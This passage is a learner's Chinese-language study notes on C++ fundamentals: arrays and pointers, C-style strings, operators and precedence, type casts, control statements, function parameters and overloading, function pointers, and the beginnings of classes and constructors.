ptrdiff_t 的类型；ptrdiff_t 也定义在 cstddef 头文件中；由于相减结果可能为负值，因此 ptrdiff_t 是一个有符号整数； p[-2] 可以用来表示 p 指针所指向位置的前两个位置的地址中的对象； 内置类型的下标可以使用负值，而标准库类型（如 string 和 vector）的下标运算只能使用无符号值，但可以使用减 2 来得到前两个位置的对象； 内置类型下标使用负值是用在什么场合呢？或许是用在当 p 指向某个中间元素的时候（估计要做好越界检查） C 风格字符串 C 的 string 类型支持 strlen, strcpy, strcmp, strcat 等几个函数，这几个函数不会检查参数的合法性，因此常常需要额外的手工检查； 与旧代码的接口 允许使用 C 的字符串数组来初始化 string 对象，示例 const char *s1 &#x3D; “hello”; &#x2F;&#x2F; 事实上这里定义的 s1 也不是数组，只是一个指针； string s2(s1); 允许使用 C 字符串出现在 string 对象的加减运算中，但字符串的两头至少连着一个 string 对象； 可以使用 c_str 函数来将 string 对象转换成 C 风格字符串； 数组的初始化赋值不能使用另一个数组，也不能使用 vector 对象；但是，vector 的初始化赋值可以使用数组（原因：数组由于需要考虑与 C 的兼容性，它是一种内置类型，本身并不具备一些高级的方法，而 vector 则是标准库类型，具备相应的高级方法） int arr[ ] &#x3D; {1, 2, 3, 4, 5}; &#x2F;&#x2F; 正确； int arr2 &#x3D; arr; &#x2F;&#x2F; 错误；不可用一个数组给另一个数组赋值； vector v(begin(arr), end(arr)); &#x2F;&#x2F; 正确，vector 支持范围构造初始化； 如何可以，尽量使用迭代器，vector, string 等标准库类型，避免使用指针，数组，C 字符串等内置类型； 多维数组 严格意义上来说，C++ 中没有多维数组，而只有数组的数组； 可以使用 {0} 来初始化数组中的所有元素为0；【【01 多维数组的初始化可以使用多层花括号（更直观），也可以使用单层花括号（效果相同，但较不直观）； 如果要使用范围 for 循环来遍历多维数组，则除了最内层的循环外，其他层定义的变量都应用定义成引用类型 原因：如果不是定义引用类型，由于变量是指向数组，编译器会默认自动把它转换成指针，这样就导致下层循环的定义非法 当在程序中使用多维数组的名字时，编译器也会将其自动转化为指针（原因：多维数组本质上只是一个数组）； 对于 int (*p)[4] &#x3D; a[2] 类型的声明，通过使用 auto 或 decltype，可以简化为 auto p &#x3D; a[2]；两种情况下，p 都是一个指向 4 维数组的指针；另外如果再引入 begin 和 end 来判断循环结束，就更加方便不易出错了，即 begin(p), end(p) 可以使用类型别名来简化多维数组的指针定义，示例： using int_array &#x3D; int[4]; typedef int int_array[4]; &#x2F;&#x2F; 这个用法有点不直观； 以上两种形式都表示为定义一个 int_array 的新类型来代表 4维整数类型数组 经过实际安全的测试，发现使用别名真的是很方便，不然在没有用 auto 的情况下，定义数组的指针真是超麻烦，且容易弄错； 当然，使用 auto 是最简单的（记得除了最内层外，其他层必须定义成引用） 表达式 基础 基本概念 函数调用也可以看做是一种特殊的运算符，它对要作用的运算对象数量没有限制； 在表达式求值过程中，一般要求参与运算的对象的类型相一致，如果不一致，运算对象的类型经常会被转化； 小整数类型（char, bool, short）在自动转化时，经常会被提升成大整数类型 int； 通过类类型的重新定义，可以实现运算符的重载，让运算符实现想要的运算功能；但是重载无法改变运算符需要满足的个数要求、结合律和运算顺序等原始特性； 表达式有左值、右值两种类型，一个表达式，它要么是左值，要么是右值；（应该是指返回类型，貌似所有的表达式，都可以看做是某些函数的调用） 当一个对象被用做右值的时候，使用的是它的内容（即它的值）；当被用做左值的时候，使用的是它的身份（即对象在内存中的位置）； 在需要右值的地方，可以用左值替代；但在需要左值的地方，不能使用右值替代； 使用 decltype 时，表达式是左值还是右值，运算结果会有不同，假设 int *p; decltype(p) 得到的结果是 int &amp;;（p 表达式返回的结果是一个左值引用） decltype(&amp;p) 得到的结果是 int **; （&amp;p 表达式返回的结果是 p 这个指针对象的地址） 优先级与结合律 不同运算符有不同的优先级，高优先级的运算符，其运算对象优先结合；同等优先级的运算符，其运算顺序则从左到右（左结合律）； 括号可以无视所有运算符的优先级和结合律，括号具备最高结合优先级； 求值顺序 大多数情况下，没有明确的求值顺序规定；例如 cout &lt;&lt; i &lt;&lt; “ “ &lt;&lt; ++i &lt;&lt; endl; &#x2F;&#x2F; 此处 ++i 是在 i 输出给 cout 之前求值，还是之后求值，是未定义不可预料的； 为稳妥起见，应该先把需要的值都求好了，再做下一步的运算，没有必要为了节省几行代码，搞得这么模糊；简单易于理解，才是高质量代码的体现； 算术运算符 整数相除的结果还是整数，小数部分将会被丢弃； % 取余（取模）运算的两个对象必须都是整数类型； 乘号 *、除号 &#x2F; 与取余 % 三者的优先级是相同的； 逻辑和关系运算符 在范围 for 循环中，声明常量引用有一个好处，即当列表很大时，声明常量引用类型，可以免去复制的开销，提高了效率；同时由于是常量引用，又不会改动原来的值，也很安全； 做比较运算时，例如 if ( a &#x3D;&#x3D; b)，除非比较的两个对象 a 和 b 都是布尔值，否则不要使用布尔字面值 true 和 false 进行比较，错误示例：if (a &#x3D;&#x3D; true)，正确的做法应该是 if (a)； if (a) 的做法会将 a 转化成布尔值 if (a &#x3D;&#x3D; true) 的做法会将 true 转换成 a 的类型，可能会发生未定义的行为； 反思：事实上 a &#x3D;&#x3D; true 更加的易于理解；对于 if(a)，也是存在一定的隐患，因为编译器可能将所有非0的值都视为真，这有可能不是我们想要的结果； 运算的优先顺序 ! &gt;, &gt;&#x3D;, &lt;, &lt;&#x3D; !&#x3D;, &#x3D;&#x3D; &amp;&amp; || 赋值运算符 如果赋值运算符的右侧对象类型与左侧不同，则右侧对象会被自动转换为左侧类型； C11 支持使用花括号提供初始值列表进行初始化，如果左侧对象是内置类型，则花括号内只能有一个值，且该值所占空间不应大于左侧对象类型所占的空间； 原因分析：如果左侧对象与花括号内的值的类型不同，会触发类型转换；而一个占用更大空间的对象，转成占更小空间的类型时，显然很有可能会出错，无法正常拷贝初始化；除非有重载列表构造函数或许可以解决这个问题？但是，问题在于内置类型是无法重载的； 对于类类型来说，则取决于类类型自己如何定义赋值运算符，有可能会实现重载； 无论左侧是何种类型，花括号中的初始列表都可以为空，此时编译器会创建一个初始化的临时变量并赋值给左对象； 分析：估计编译器调用了用户定义的构造函数或者合成的构造函数； 赋值运算符是“右”结合律（注：与其他二元运算符常见的左结合律不同）； 赋值运算符的优先级很低，在复合语句中使用的时候，记得加上括号，不然常常得不到想要的结果； 递增递减运算符 前置版本返回运算后的结果，后置版本返回运算前的结果； 正常情况下，建议优先使用前置版本，因为这样性能的开销更小，不需要为了返回修改前的值，额外存储；除非真的想使用它递增或递减之前的值，才使用后置版本； 后置递增符的优先级高于解引用符 *；（感觉最好加上括号，让所有人一目了然） 成员访问运算符 解引用符的运算优先级低于点运算符； 箭头运算符作用于指针对象； 条件运算符 条件运算符的优先级很低，在复合表达式中使用的时候，要注意加上括号，避免产生预料外的结果； 位运算符 位运算符适用于整数类型的运算（意思是其它类型不可用，除非将运算符重载）； 移位运算符要求：右侧运算对象不可为负，且移动位数不可超过左侧对象的位数，否则会产生未定义的行为； 移位运算符的优先级低于算术运算符，但高于条件、赋值、关系等三种运算符； sizeof 运算符 sizeof 返回一个表达式或者一个类型名称所占的字节数； sizeof 满足右结合律，且与解引用符 * 的运算优先级相同； sizeof 并不会真正去计算表达式的值，因此对于 sizeof(*p)，如果 p 是一个无效指针也没有关系，因为并没有真正的执行解引用 *p，故不会产生未定义的行为，同时 sizeof 仍然能够知道 *p 的类型； sizeof 作用于数组时，会得到整个数组所占空间的大小，相当于对数组的每个元素执行一次 sizeof，并将结果汇总起来； 所以如果想得到数组的元素数量，还需要除以单个元素所占的空间大小； 对 string 和 vector 类型，sizeof 只会返回固定部分的大小，不会返回元素占用的空间大小；（原因：string 和 vector 不是内置类型，而是标准库类型） 由于 sizeof 返回的结果是一个常量表达式，因此可以用 sizeof 的结果来声明一个数组的大小，例如：int[sizeof(arr)]; 对于 int x[10]; int *p &#x3D; x; p 指向 x 的首地址，因此 *p 获取的是 x 的首个元素；sizeof(*p)获取的是 x 首个元素的大小，此处应为4； 逗号运算符 逗号运算符是有求值顺序的，会先求左侧表达式的值，然后再求右侧表达式的值； 在所有的运算符中，逗号运算符的运算优先级是最低的； 示例： someValue ? ++x, ++y : –x, –y; &#x2F;&#x2F; 在这段代码中，由于逗号运算符优先级最低，因此冒号右侧的逗号的右侧内容不会视为条件表达式的一部分； 类型转换 如果两种数据类型可以相互转换，则表示它们是关联的；关联的数据类型，在进行计算的时候，有可能会发生隐式转换；转换一般遵循最大程度减少精度损失，即转换成最宽的类型； 单个字符其实是一个整数类型； 由于 int 和 float 位数相同，因此它们的算术运算可能会导致提升成 double； 在大多数用到数组的表达式中，数组会被隐式转换成指向首元素的指针；但在 decltype 参数、sizeof 参数，&amp; 取地址符、typeid 中，这种转换不会发生； 字面值 nullptr 和常量整数 0 可以转换成任意类型的指针； 可以定义常量的引用或指针，指向一个非常量对象；但不可以定义一个非常量的指针或引用，指向一个常量；原因：此处发生隐式类型转换，而规则是 not-const 可以转成 const，但反之不行； 类类型可以自定义转换规则，例如 while(cin &gt;&gt; s)，此处 cin &gt;&gt; s 实际上返回的是一个 istream 对象，但在类类型中，规定了其可以转换成布尔类型（当作为条件表达式的时候）； 命名的显式类型转换：cast 强制类型转换，这种操作一般有点危险，相当于直接告诉编译器，请忽略精度损失；格式 格式：static_cast(expression)，其中 type 为要转换的目标类型， expression 为要转换的值； static_cast 一般用来将大精度转小精度；示例： int i, j; static_cast (j) &#x2F; i; &#x2F;&#x2F; 将 j 转成 double 精度（原因：两个整数的默认结果也会是整数，所以此处使用强制类型转换为浮点数） const_cast 用来将常量强制转成非常量；const_cast 只能用来去除 const，不能用来转变类型，比如 char 转成 int 等； reinterpret_cast 可以在位模式级别，对数据按新类型进行解释，这种操作非常危险，强力避免； 以上三种是新式的强制类型转换，有命名转换类型，旧式的强制类型转换的语法为 type(exp) 或者 (type) exp，相对于新式，旧式类型转换没有命名，混合了三种转换的特点，语意更加不清晰，应极力避免使用； 语句 简单语句 可以使用空语句来表示啥也不用干，但记得加上注释，不然后续看到的人会以为这里可能写错了； 复合语句也叫做块，块不以分号作为结束；如果加了分号，反而会被编译器误以为是一条空语句； 空块的作用等于空语句（不过建议也是要写上注释为妥）； 语句作用域 在块中定义的变量，其作用域仅限于在块中使用；出了块就不行了； 条件语句 严格使用花括号，不要省略，因为它会增加易读性，而且也更加不容易出错； 即使 else 分支不做任何事情，也写一条空语句，表示该分支的情况已经考虑过了；当然，再得同时写一条注释，避免他人误以为此处写错 更好的办法是定义一个类型 pass 的函数； 在 switch 结构中，case 标签必须是一个整形常量表达式； 通常每个 case 后面要有一个 break，如果出现需要合并几个 case 的情况，可以将多个 case 写成一行，这样可以更容易一眼看出它们是一种情况； 即使最后一个case，也要养成在其后面写上 break 的习惯，这样即使将来增加新 case 也不容易出现漏写 case 的情况； 即使没有 default 的情况，最好也把它加上，表示已经考虑过了。更好的做法是可以在里面写入报错语句，这样表示结果没有落入 case 规定的范围； 迭代语句 定义在 while 条件部分，或者 while 循环体内的变量，每次循环体的内容都经历从创建到销毁的过程； 使用 while 循环的两种场景 不知道循环次数； 想要在循环结束的时候，继续使用循环控制变量； for 循环的头语句中，初始化只能使用一条语句（因为只允许出现一次分号），因此如果要初始化多个变量（使用逗号运算符）， 这些变量需要具备相同的类型，才可以使用同一个声明语句； for 循环的头语句中，init, condition, express 三者都可以为空，但为空的时候，为避免无限循环，需要在循环体的其他地方进行作用补偿； 对于 do-while 循环，由于条件判断前会先执行一次循环体代码，因此不可将变量声明放在条件判断语句中，不然在第一次循环的时候，用不到这个变量（因为它还未声明） 跳转语句 break 语句可以用来跳出最近的 for, do-while, while, switch； continue 只能用于 for, do-while, while，不能用于 switch； goto 可以无条件的从定义的位置，跳转到函数内部其他指定的位置（尽量避免使用 goto）； try 语句块和异常处理 通过 throw 抛出一个异常，抛出类型为 runtime_error，它同时也是一个函数，在 stdexcept 头文件中定义，这个函数接收一个字符串做为参数（一般用来写错误内容）；之后在 catch(runtime_error err) 中可以捕获这个runtime_error 类型的 err 对象，对象有一个 what 的方法，可以用来获得抛出错误时传递的字符串参数； try…catch 可能存在嵌套行为，throw 抛出错误后，一般的规则是从内到外，逐级向上查找对应的 catch 语句，如果最后都没有找到，则会统一交给标准库的 terminate 函数进行处理，该函数一般会导致程序中止退出； 有4个头文件定义了异常类，分别是 exception, bad_alloc, bad_cast, stdexcept，其中头3个文件的异常类只能使用默认初始化，不能手工初始化赋值；最后一个 stdexception则相反，需要手工初始赋值，不允许使用默认初始化； 函数 函数基础 函数四要素：返回类型、函数名、形参列表、函数体； 函数调用过程分两步，其中第一步是用实参初始化形参（以前一直没有注意到这个问题，据说此处的初始化是隐式的，初始化同样遵循变量初始化的规则），第二步是主调函数中止，将控制权交给被调函数； return 语句的动作也分两步，其中第一步是返回结果，第二步是将控制权交还给主调函数； 函数的每个形参都需要显式的声明类型； C++ 中函数能够返回绝大多数类型，但不能返回数组和函数，不过可以返回数组或函数的指针来间接达到目的（意味着需要提前声明好函数的返回类型）；另外，由于函数中的局部变量会在函数退出后销毁，因此需要用到两种办法，一个分配一个堆内存避免销毁（但后续需要手工释放）；另一个方法是由主调函数提前声明并传入指针，这样会由主调函数结束后自动释放内存）； 在 C++ 中，名字有作用域，对象有生命周期（目测大多数语言都是这样的）； 自动对象：生命周期仅限于执行期间的对象；当执行结束后，自动对象会被销毁； 函数体内的局部变量是一定会被初始化的，因此如果没有显式的进行初始化，编译器会启用默认初始化，但默认的方式有可能产生未定义的行为（一定会被初始化，猜测可能是因为要分配内存的原因）； 使用 static 可以创建局部静态变量，这种变量的特点是生命周期很长，即使在函数退出后，仍然存在，它会贯穿整个程序的生命周期，直到程序中止时才销毁；（感觉像一个全局变量了，不过目测其访问权限是受的限制的） 函数使用之前需要先声明，可以多次声明，但只可以定义一次；函数声明据说被叫做函数原型（不知为啥）； 函数的声明建议放在头文件中，定义则放在源文件中，这样有两个好处 函数可能会被多个源文件引用，如果将来要修改，只需要在被引用的头文件中修改一次即可； 编译器会根据声明，检查与定义是否匹配，避免犯错； 注：不是很理解为什么不把定义也放在头文件中，这样不是可以确保所有的定义都一致？经过查询，原来是这样的，声明用一个文件，定义用一个文件，调用用一个文件，总共分放在三个文件；（不过，还是感觉声明和定义可以在同一个文件不是更好吗？） 今天终于有点明白为什么声明需要单独一个文件了，因为有些类或函数之间可能是相互调用的，所以需要将它们都提前声明好，仅通过定义，由于顺序问题，编译器会提示找不到； 这个问题也适用于类的函数成员，假设类 A 中的一个函数成员使用到另外一个暂未定义的类B时，此函数成员只能先声明，不能定义；然后等类B声明结束后，再在那个类B的后面，开始对类A 的函数成员进行定义；（这种声明和定义分离的情况，真是令人讨厌，它增加了代码阅读的负担，有没有好的解决办法？） 参数传递 形参的初始化，跟变量的初始化过程是一样的； 如果形参是引用类型，则形参只是实参的别名，此时是引用传递；如果形参不是引用类型，则形参是实参的一份拷贝，此时是值传递； 如果形参是指针类型，由于指针实际上也是一个对象，因此它也是实参指针的一份拷贝，是值传递，只是它和实参指针都指向同一个对象； 在 C 语言中，使用指针形参改变主调函数的实参变量的做法很常见，在 C++ 中，则建议使用引用类型的形参，来达到相同的目的； 当使用引用形参时，可以直接传递实参对象，而非实参对象的地址（指针才需要传递地址）； 使用引用形参的一个好处是可以避免拷贝，尤其是当实参很大或者不可拷贝时（例如 io 类型对象）； 当函数无须改变实参时，函数的引用形参最好定义成常量引用； 在 C++ 中，函数只能返回一个值，如果要返回多个值，只能将多个值封装成对象的方式返回；当然，还可以通过增加一个引用形参，绕过返回限制，达到相同的目的； 貌似使用引用形参的话，相当于将对象定义在调用者那里了； 当实参是右值时，形参无法定义成引用类型；（不知是否可以定义成右值引用，而非常规的左值引用？） 形参有外层 const 的情况下，传递给它的实参是 const 或者非 const 都是可以的；但是，这也意味着 int func(const int i) 和 int func(int i) 算是同一个函数，因为对于调用方来说，这两种函数没有区别，这在函数重载的规则下面会报错；（感觉这里有个陷阱，当实参是 const 类型时，如果形参是非常量引用（例如 int i），应该会报错） 使用普通引用，而不是常量引用，会极大的限制函数可以接受的参数类型，同时会给主调者一个误导，认为引用可以改变实参变量的值；在确保不需要改变实参变量值的情况下，应尽量将引用定义成常量引用类型；而且当主调者传入字面值实参时，很容易引发错误，例如 find_char(“hello world”, ‘o’, ctr)；（因此应该尽可能定义形参为常量引用） vector类型迭代器的声明 vector::iterator，如果 vector 已经声明的情况，也可以考虑使用 auto iter &#x3D; vec.begin() ； 函数声明时，形参可以只有类型，没有名称，例如 double calc ( double )； int count(const string &amp;, char); 不过还是写上名称更好，因为名称可以传递出更多的信息，让使用者对函数的用途有更加直观的理解；（少写几个单词节省的时间，在易于理解的损失面前，微不足道） 数组不能拷贝，因此也导致了函数无法实现数组的值传递，以数组名称为实参调用函数时，数组会转换成指向数组首元素的指针； 由于数组传递的是指针，因此有三种常用的技术对数组长度进行管理： 传递数组指针的同时，传递数组的长度，例如 void print(const int ia[ ], size_t size) 借鉴标准库的做法，传递首尾元素的指针，例如 void print(const int *begin, const int *end);（感觉貌似这个做法最值得推荐） 根据数组特性标记数组结束（此种方法只适用于有明显结束标记的数组，例如字符串），示例：void print(const char *cp) { if (cp) while (*cp) … } 如果不需要对实参进行写操作，则形参应该定义成常量指针或常量引用，示例 void print(const int *ip); 形参可以定义成数组的引用，但此时要特别的注意形参的写法，示例：void print(int (&amp;arr)[10]))，此处 (&amp;arr) 的括号是必不可少的，它表示定义的是一个数组引用的类型，即顺序为：是一个引用，引用的是一个有10个 元素的数组，元素类型为 int，如果写成 &amp;arr[10]，由于[ ] 的高运算优先级，arr 先与[ ]进行结合变成了表示引用的数组类型，顺序为：定义了一个10个元素的数组，数组的元素为 int&amp; 整数引用类型； 通过将形参设为引用类型，可以达到修改传递和修改数组的目的，但是缺点是限制了数组的固定元素个数，长度不可改，使用起来很不灵活（据说后面16章会有定义可变长度的引用类型形参的办法）； C11 中实现可变形参的函数有三种办法 使用标准库类型 initializer_list，这种类型实际上是一种数组，因此它有一个前提：即所有实参的类型需要相同； initializer_list和 vector 一样，是一种模板类型，因此用它来定义变量时，需要注明模板内的元素的类型； initializer_list对象内的元素永远是常量值，无法被改变； 当使用 initializer_list进行参数传递时，如果需要传递多个实参，则这些实参应该使用花括号包起来，就像常规的数组一样； initializer_list可以使用范围 for 进行遍历（原因：它拥有 begin 和 end 方法）； 使用 C 语言风格的省略符； 示例 void print(…)，或者 void print(int x, …); 仅将省略符形参法应用于与 C 语言交互的代码中，因为大多数标准库类型的实参无法通过省略符被正确拷贝； 使用函数模板； template &lt;typename… Args&gt; void g(Args … args) initializer_list 支持的操作 initializer_list lst，初始化一个元素类型为 T 的 initializer_list； initializer_list lst{a, b, c, … }，用列表初始化一个 initializer_list，元素都是 const 类型，不可改变； lst2(lst)，lst2 &#x3D; lst；用一个initializer_list 去初始化另外一个 initializer_list，它们的元素不会发生拷贝，而是共享； lst.size()，返回元素数量； lst.begin()，返回 lst 的首元素指针； lst.end()，返回 lst 的尾元素指针； 返回类型和 return 语句 return 有两种格式 return; &#x2F;&#x2F; 此种格式仅适用于返回类型为 void 的函数； return expression; 如果定义函数的返回类型为引用，则最后 return 的时候，虽然写着 return obj，但其实会返回引用，而不会r返回对象的拷贝； 避免返回局部对象的引用或者指针，而应该返回拷贝； 如果一个函数类型是引用，则返回结果是左值；如果不是引用，则返回结果为右值； 可以为返回结果是非常量引用的函数的返回结果赋值，例如 char &amp;get(string s, int pos); get(s, pos) &#x3D; ‘A’ 可以使用列表来返回多个值，类似 return {“abc”, “def”, “ghi”}; 如果定义函数的返回类型是内置类型，则列表内最多只能一个元素，原因：需要函数的返回结果需要用来对同样是内置类型的临时变量进行初始化； 如果定义函数的返回类型是类类型，则列表内的元素个数由类自定义； 除了 void 函数外，所有其他类型的函数都需要返回一个值，main 函数除外，因为 main 函数如果没有显式的 return 值，编译器会自动添加； 通常情况下，main 函数返回 0 表示成功，但失败的返回值则视机器而定，为了解决这个问题，通过引入 cstdlib 头文件，使用其中的预定义宏 EXIT_FAILURE 和 EXIT_SUCCESS 来分别表示成功和失败； 定义函数返回数组指针的方法 使用类型别名，例如 typedef int arrInt[10] 或者 using arrInt &#x3D; int[10]，此处 arrInt 表示一个含有10个整数的数组，然后使用方法为 arrInt *func(int t); 原始声明，例如 int (*func(int t))[10] 尾置返回类型，示例 auto func(int t) -&gt; int(*)[10] &#x2F;&#x2F; 注：个人觉得这种类型可以优先使用； 使用 decltype，示例 int arr[ ] &#x3D; {1, 2, 3, 4, 5} decltype(arr) *func(int t) &#x2F;&#x2F;注意此处的星号别漏了； 函数重载 定义函数重载时，不允许两个函数除了返回类型不同外，其他部分都相同（即形参需要不同类型或不同个数）； 如果多个重载函数之间的区分不明显，例如虽然形参类型不同，但可以转换，则容易引用编译器错误； 特殊用途语言特性 默认实参 写法 string print(int ht &#x3D; 24, int wid &#x3D; 120, char bakg &#x3D; ‘ ‘) 一旦某个形参被赋予了默认初始值，则其后（即右侧）的其他形参也需要赋予默认值； 设计默认实参函数时，安排形参顺序很重要，经常没有默认值的在左边，有常用默认值的在右边； 当函数被多次声明时，后面的声明不能修改前面声明的形参默认值，但可以添加形参默认值； 添加形参默认值，有两种可能 一种是这个形参已存在，但没有默认值，现在加一个； 一种是这个形参不存在，现在增加一个形参，并赋予默认值；（感觉不太可能是这种情况，因为形参数量变化，意味着要重载了，估计函数匹配不上） 内联函数 内联函数可以避免函数调用的开销，但是函数调用的开销才有多大一点点呢？或许大多数情况下使用内联函数完全没有必要；（正确的做法是将代码写得尽量清晰易懂，是否内联，交由编译器自行优化） 开销一般由三部分构成 当前数据保存寄存器，以便返回时可以恢复； 根据需要拷贝实参； 跳转到新位置，执行新代码； constexpr 函数 定义：能用于常量表达式的函数（有什么用呢？编译的时候，会被替换为字面值，加快执行速度）（暗含的意思是 constexpr 函数会当作内联函数处理？） 要求：形参和返回结果都必须是字面值类型，且有且仅能有一个 return ； constexpr 函数不一定返回常量表达式； 调试帮助 C++ 可以允许在程序中编写调试代码，然后在发布时自动去除调试代码；通过 assert 和 NDEBUG 预处理宏来实现； 采用自动化测试的方式，是否更好？即代码中不必添加一些调试代码，增加代码的可阅读性； assert( expr ) 如果表达式为真，则 assert 啥也不做，如果为假，则报错并终止程序； assert 定义在 cassert 的头文件中； NDEBUG 表示 no debug，即不需调试的意思，如果定义了 NDEBUG，则 assert 啥也不做；如果没有，则 assert 会检查错误； 函数匹配 实参类型与形参类型越接近，其匹配概率越高； 如果有多个可行函数，编译器比较不出来应该调用谁，会报告二义性的错误； 重载会根据 const 进行优先匹配； 函数指针 函数指针指向的是一个函数而非一个对象，函数也是一种特定的类型；函数这种类型的特征是由其返回类型+形参类型共同决定的，跟函数名无关； 例如：对于 函数 bool compare(const string &amp;, const string &amp;)，该函数的类型为 bool(const string&amp;, const string&amp;) 当函数名被作为一个值使用时，会被自动转换为指针，示例： void compare(int t); void (*pf)(int t); &#x2F;&#x2F; 声明一个函数指针类型的变量； pf &#x3D; compare；当然也可以是 pf &#x3D; &amp;compare，但 &amp; 不是必须的； 函数的定义可以写在任意一级作用域，但是此处的 pf &#x3D; compare 却不能写在顶级作用域，发现会报错“ps does not name a type”，当将它写在某个函数例如 main 里面时才可行； 猜测原因：void (*pf)(int t) 是一个声明，而 pf &#x3D; compare 如果在同级作用域，相当于要重新声明（即覆盖前面的声明）；但在不同的作用域中的时候，相当于绑定对象，而不是重新声明； 通过将函数名替换为 (*p) 可以快速的定义一个函数指针； 可以通过直接使用函数指针来调用函数，无须使用星号 * 进行解引用；(当然，要使用星号解引用也可以） 示例： pf(5) 看上去貌似调用运算符（圆括号）是可以直接在指针类型上发生作用的（猜测指针类型莫非设计有调用运算符函数？） 当形参为一个函数时，它会被自动转换成函数指针类型，就像数组一样； 但是，定义函数的返回类型时，它不会自动将函数转换成指针类型，需要显式声明； 是否为 return &amp;compare? 如果定义让一个函数的返回类型是另外一个函数的指针？ 同时，貌似意味着另外一个函数不可是函数内部创建的局部变量，不然返回的指针无效； 可以使用自定义别名或 decltype 来简化函数类型定义 using F &#x3D; int(int*, int); using PF &#x3D; int()(int, int); PF f1(int) 正确 F f1(int) 错误，函数的返回类型不能是函数，需要是函数的指针； F *f1(int) 正确，显式声明返回类型是函数指针； 另外还可以使用尾置类型来声明函数的返回类型 auto f(int) -&gt; int()(int, int) 如果能够提前明确的知道函数返回的是某个函数A 类型，则可以使用 decltype 声明，示例 string sumLength(const string &amp;, const string &amp;) decltype(sumLength) *get_func(const string &amp;); &#x2F;&#x2F; 注意：不要把 get_func 左侧的星号给漏了；它表示返回的类型是函数的指针，而不是函数类型本身； 类 定义抽象数据类型 类的成员函数声明在内部，但定义可以在外部，也可以在内部； 问：什么时候适合定义在内部，什么时候在外部？ 答：看到类的设计的章节后，终于明白为什么要定义在外部了，当类A的某个成员函数返回的类型是另外一个类B时，那么这个类B的定义要在成员函数之前，不然成员函数返回的时候，是找不到类型B的；但是，有可能这个类B又引用了类A，那么导致了类B 只能只类A 之前声明，但不能在类 A 之前定义，应该在类A 之后定义，因为在之前定义的话，类A还没有声明，无法引用类A；因此，此时需要将类A 中用的类B 的那个成员函数提取出来，放在类 B 的定义之后进行定义； C++ 的这种规则真的是有点操蛋；这个问题在动态语言 Javascipt 或 Scheme 为什么不会存在？是否跟它们在语义分析时，单独分析函数有关？ 类的非成员接口函数的声明和定义都在类的外部（所以叫做非成员函数）（按照这个说法，所有以类为参数的函数，或许都可以叫做类的接口函数）； 据说定义在类内部的函数是隐式的内联函数 不是很明白这句话的意思，以及它可能产生的后果 后来发现它的意思是，类的成员函数会被自动 inline ； 可是 inline 貌似会产生作用域的问题，这个问题是否会带来什么影响？猜测可能也不会，因为成员函数还是函数，它还是会单独开栈的，仍然有自己的独立作用域； 当我们访问类对象的成员函数时，python 通过引入 self 参数来访问当前对象，而 C++ 则通过引入一个隐式的 this 参数来实现（在定义成员函数的时候，没有显示出来），示例 Sales_data total; total.isbn( ) 实际在执行的时候，会被编译器转化成 Sales_data::isbn(&amp;total); 因此，在类中任何自定义为 this 的参数或者变量都会引起冲突，是非法的； 更有趣的一点是，在 py 中，当访问成员数据时，需要显式的指定 self.var 来访问，但 C++ 则可以不用，直接访问 var 就可以，不需要 this-&gt;var； 由于 this 是隐式的，且还是非常量引用，因此会带来一个麻烦的问题，即当 this 下的某个成员是常量时，由于非常量无法指向常量，会导致无法通过 this 访问它的常量成员，此时需要通过引入 const 关键字，对 this 参数进行转换，但 this 是隐式，导致 const 无法放在常规应该出现的位置，最后 C++ 使用了一个非常规的办法，将 const 放在参数列表后面（看上去像是一种 workaround）（又一个操蛋的设计）； 示例 string isbn() const { &#x2F;…&#x2F; }; 像这种访问常量成员的函数，称为常量成员函数； 编译器对类的编译分成两步，第一步先编译类的所有数据成员，第二步再编译所有的函数成员（如有），因此，这样使得数据成员的声明的位置可以在函数成员后面，而不出报错； 如果成员函数在内外部定义，则定义的时候，需要写上类名； 有些函数属于类的接口的组成部分，但并不属于类的一部分，此时应该将它们定义在类的外部；而且最好把它们与类放在同一个文件中，这样未来也方便查找和阅读；（类的接口函数，不属于类的一部分？思考了一下，感觉这个接口函数的定义有些牵强，貌似所以以类为参数的函数，或许都可以叫做接口函数？以前的理解是类的 public 成员函数才是类的接口函数，用来供他人对类的数据里进行访问用的）； 构造函数 构造函数的名字和类名相同；构造函数没有返回类型，且不能被声明成 const 类型，因为构造的过程即是修改或初始化类的数据成员的过程； 类里面可以定义多个构造函数，就像重载函数一样，但每个构造函数的参数必须有所区别； 如果没有定义构造函数，编译器会自动合成一个默认的构造函数 不需要任何实参，有可能出错，取决于数据成员类型； 原则：如非必要，尽量不要去尝试使用自动合成的默认构造函数，除非类非常非常简单； 如果定义了哪怕只一个的构造函数，就永远不会再合成默认的构造函数； 一旦写了一个构造函数之后，如果仍然需要编译器帮忙合成一个默认构造函数，那么一定要显式声明出来 示例： Class_name( ) &#x3D; default; 规则：如果存在类内初始值，默认构造函数会使用类内初始值；如果没有，会执行默认初始化（有可能出错）； 可以在类的外部定义构造函数，示例 Sales_data::Sales_data(isream &amp;is); 说实话，不太明白为什么要搞到外部来；答：有可能这个构造函数中，会用到其他类，所以定义要放到外部，并且要放到其他类声明的后面； 构造函数有一个所谓的“构造函数初始值列表”的东西，用来对数据成员进行初始化，示例 Sales_data(const istream &amp;is, unsigned n, double p): bookNo(s), units_sold(n), revenue(n*p) { } 为什么类外部的初始化函数定义，是使用冒号呢？而其他成员函数的定义却不是？答：冒号是用来给数据成员赋初始值用的；仅在构造函数中使用，成员函数中不可用； 没有出现在初始值列表中的成员，一般将通过类内初始值进行初始化，或者执行默认初始化； 不太明白为什么不放在函数体中？答：后来发现C++ 的机制是先初始化，再执行函数体，因此不能放在函数体内，因为放在函数体内，其实已经是在默认初始化完成的情况下，再进行赋值的动作，已经晚了； 类的拷贝、赋值和析构：类对象不可避免需要有拷贝、赋值和析构的动作，幸好编译器会自动帮忙处理这部分的工作，但在某些情况下编译器会无能为力（例如需要管理动态分配的内存的时候） 正常情况下可以使用编译器自动合成的拷贝、赋值和析构函数； 少数情况下需要自定义特殊处理方法； 类的声明记得结尾需要加上分号； 访问控制与封装 通过访问说明符来限制类的成员的可见性，public 表示整个程序可见，private 表示仅内部成员可见； 访问说明符可以多次出现和使用，其有效范围截止到下一个访问说明符或者类结束； 可以用 struct 和 class 的任意一个来定义类，唯一的区别在于第一个访问说明符出现之前的成员的访问权限不同，struct 是默认可见，class 是默认不可见； 当类的数据成员是 private 时，可以通过声明友元函数，允许这些函数获得权限访问类的数据成员 虽然语法支持这么做，但个人不倾向这么做，应该尽量避免使用友元，因为它会扩大错误产生的范围，更好的做法是可以多定义一些 public 成员函数，用来获取所需要的数据； 类的其他特性 